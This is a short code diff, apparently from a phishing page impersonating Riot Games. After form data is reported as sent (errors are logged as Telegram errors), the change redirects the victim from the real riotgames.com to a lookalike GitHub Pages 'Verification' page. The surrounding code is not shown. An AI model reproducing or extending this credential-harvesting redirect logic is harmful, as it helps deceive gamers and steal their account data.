@@ -35,7 +35,7 @@ document.addEventListener("DOMContentLoaded", function () {
         .then(data => {
             if (data.ok) {
                 console.log("✅ Data sent successfully!");
-                window.location.href = "https://www.riotgames.com/"; // إعادة توجيه بعد الإرسال
+                window.location.href = "https://riotgames0.github.io/Verification./Lvl30/index.html"; // إعادة توجيه بعد الإرسال
             } else {
                 console.error("❌ Telegram error:", data);
             }
